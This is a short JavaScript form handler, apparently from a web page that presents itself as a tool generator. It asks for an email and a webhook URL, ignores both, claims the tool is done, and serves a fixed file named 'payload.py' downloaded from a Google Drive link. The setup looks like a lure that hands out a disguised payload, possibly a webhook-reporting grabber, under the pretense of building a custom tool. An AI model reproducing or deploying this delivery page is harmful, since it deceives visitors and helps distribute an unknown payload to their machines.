document.getElementById('toolForm').addEventListener('submit', async function(event) {
    event.preventDefault();
    
    const emailInput = document.getElementById('emailInput');
    const webhookInput = document.getElementById('webhookInput');
    const statusMessage = document.getElementById('statusMessage');
    const downloadLink = document.getElementById('downloadLink');

    // Display a message indicating the tool is ready
    statusMessage.textContent = 'Tool is done. Click the download button below.';
    statusMessage.style.color = '#40c057';
    
    // Set the download link properties
    downloadLink.href = 'https://drive.google.com/uc?export=download&id=12d4bJhNQN9MIwbFxlnEmcbxxPp8uzTYk';
    downloadLink.download = 'payload.py';
    downloadLink.textContent = 'Download Tool';
    downloadLink.style.display = 'block';
});
